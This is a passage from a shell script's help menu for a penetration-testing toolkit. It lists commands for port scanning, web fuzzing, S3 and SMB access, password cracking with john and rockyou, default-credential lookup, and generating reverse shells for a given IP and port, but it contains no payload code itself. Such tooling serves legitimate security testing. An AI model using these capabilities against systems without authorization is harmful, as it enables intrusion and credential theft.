        echo -e "\t$CYAN ransack $GRAY[HOST] [OPTIONS] [PROTO http/https]$CLR\t -> recon; options: nmap|nikto|vhosts|ffuf|feroxbuster|x8"
        echo -e "\t$CYAN kiterunner $GRAY[HOST] (*apis)$CLR\t\t\t -> runs kiterunner against apis file on [HOST] (create apis file first ;) )"
        echo -e "$BLUE_BG:: WEB ::\t\t\t\t\t\t$CLR"
        echo -e "\t$CYAN fu $GRAY[URL] [DICT] [*EXT/*ENDSLASH.]$CLR\t\t -> webapp resource enumeration with ffuf (DICT: starter, lowercase, wordlist etc.)"
        echo -e "\t$CYAN fufilter $GRAY[URL] [DICT] [SIZE] [*EXT/*ENDSLASH.]$CLR\t -> webapp resource enumeration with ffuf; filter out resp. size SIZE (DICT: starter, lowercase, wordlist etc.)"
        echo -e "\t$CYAN b64 $GRAY[STRING]$CLR\t\t\t\t\t -> decodes Base64 string"
        echo -e "\t$CYAN apifuzz $GRAY[BASE_HREF] [ENDPOINTS]$CLR\t\t -> fuzzing API endpoints with httpie"
        echo -e "\t$CYAN gql $GRAY[TARGET_URL]$CLR\t\t$YELLOW(GraphQL)$CLR\t -> checking GraphQL endpoint for known vulnerabilities with graphql-cop"
        echo -e "$BLUE_BG:: CLOUD ::\t\t\t\t\t\t$CLR"
        echo -e "\t$CYAN s3 $GRAY[bucket]$CLR\t\t\t$YELLOW(AWS)$CLR\t\t -> checks privileges on AWS S3 bucket (ls, cp, mv etc.)"
        echo -e "\t$CYAN s3go $GRAY[bucket] [key]$CLR\t\t$YELLOW(AWS)$CLR\t\t -> get object identified by [key] from AWS S3 [bucket]"
        echo -e "$BLUE_BG:: PENTEST TOOLS ::\t\t\t\t\t$CLR"
        echo -e "\t$CYAN quick_nmap_scan $GRAY[IP] [*PORTS]$CLR\t\t\t -> nmap --top-ports [PORTS] to quickly enumerate open N-ports"
        echo -e "\t$CYAN full_nmap_scan $GRAY[IP] [*PORTS]$CLR\t\t\t -> nmap --top-ports [PORTS] to enumerate ports; -p- if no [PORTS] given; then -sV -sC -A on found open ports"
        echo -e "\t$CYAN http $GRAY[PORT]$CLR\t\t\t\t\t -> runs HTTP server on [PORT] TCP port"
        echo -e "\t$CYAN generate_shells $GRAY[IP] [PORT] $CLR\t\t\t -> generates ready-to-use reverse shells in various languages for given IP:PORT"
        echo -e "\t$CYAN nfs_enum $GRAY[IP]$CLR\t\t\t\t\t -> enumerates nfs shares on [IP] (2049 port has to be open/listed in rpcinfo)"
        echo -e "$BLUE_BG:: SMB SUITE ::\t\t\t\t\t\t$CLR"
        echo -e "\t$CYAN smb_enum $GRAY[IP] [USER] [PASSWORD]$CLR\t\t -> enumerates SMB shares on [IP] as [USER] (eg. null) (445 port has to be open)"
        echo -e "\t$CYAN smb_get_file $GRAY[IP] [user] [password] [PATH] $CLR\t -> downloads file from SMB share [PATH] on [IP]"
        echo -e "\t$CYAN smb_mount $GRAY[IP] [SHARE] [USER]$CLR\t\t\t -> mounts SMB share at ./mnt/shares"
        echo -e "\t$CYAN smb_umount $CLR\t\t\t\t\t -> unmounts SMB share from ./mnt/shares and deletes it"
        echo -e "$BLUE_BG:: PASSWORDS CRACKIN' ::\t\t\t\t$CLR"
        echo -e "\t$CYAN rockyou_john $GRAY[TYPE] [HASHES]$CLR\t\t\t -> runs john+rockyou against [HASHES] file with hashes of type [TYPE]"
        echo -e "\t$CYAN ssh_to_john $GRAY[ID_RSA]$CLR\t\t\t\t -> id_rsa to JTR SSH hash file for SSH key password cracking"
        echo -e "\t$CYAN rockyou_zip $GRAY[ZIP file]$CLR\t\t\t\t -> crack ZIP password"
        echo -e "\t$CYAN defcreds $GRAY[DEVICE/SYSTEM]$CLR\t\t\t -> default credentials for DEVICE or SYSTEM"
        echo -e "$BLUE_BG:: SAST ::\t\t\t\t\t\t$CLR"
        echo -e "\t$CYAN um $GRAY[FILE]\t\t\t$YELLOW(JavaScript)$CLR\t -> un-minifies JS file"
        echo -e "\t$CYAN snyktest $GRAY[DIR]\t\t\t$YELLOW(JavaScript)$CLR\t -> runs snyk test on DIR (this should be root of Node app, where package.json exists)"
        echo -e "\t$CYAN pysast $GRAY[DIR]\t\t\t$YELLOW(Python)$CLR\t -> Static Code Analysis of Python file with pyflakes, mypy, bandit and vulture"
        echo -e "$BLUE_BG:: RE ::\t\t\t\t\t\t$CLR"
        echo -e "\t$CYAN disass $GRAY[BINARY]\t\t$YELLOW(asm)$CLR\t\t -> disassembels BINARY and saves to 1.asm in the same directory"
        echo -e "\t$CYAN unjar $GRAY[.jar FILE]\t\t$YELLOW(Java)$CLR\t\t -> open FILE.jar file in JD-Gui"
        echo -e "$BLUE_BG:: ANDROID ::\t\t\t\t\t\t$CLR"
        echo -e "\t$CYAN jadx $GRAY[.apk FILE]\t\t$YELLOW(Java)$CLR\t\t -> open FILE.apk file in JADX GUI"
        echo -e "\t$CYAN dex_to_jar $GRAY[.dex file]$CLR\t\t$YELLOW(Java)$CLR\t\t -> exports .dex file into .jar"
        echo -e "\t$CYAN apk $GRAY[.apk FILE]$CLR\t\t$YELLOW(Java)$CLR\t\t -> extracts APK file and run apktool on it"
        echo -e "\t$CYAN abe $GRAY[.ab FILE]$CLR\t\t\t$YELLOW(Java)$CLR\t\t -> extracts Android .ab backup file into .tar (with android-backup-extractor)"
        
        echo -e "\n--------------------------------------------------------------------------------------------------------------"
        echo -e "$GREEN Hack The Planet!\n$CLR"
    ;;
esac
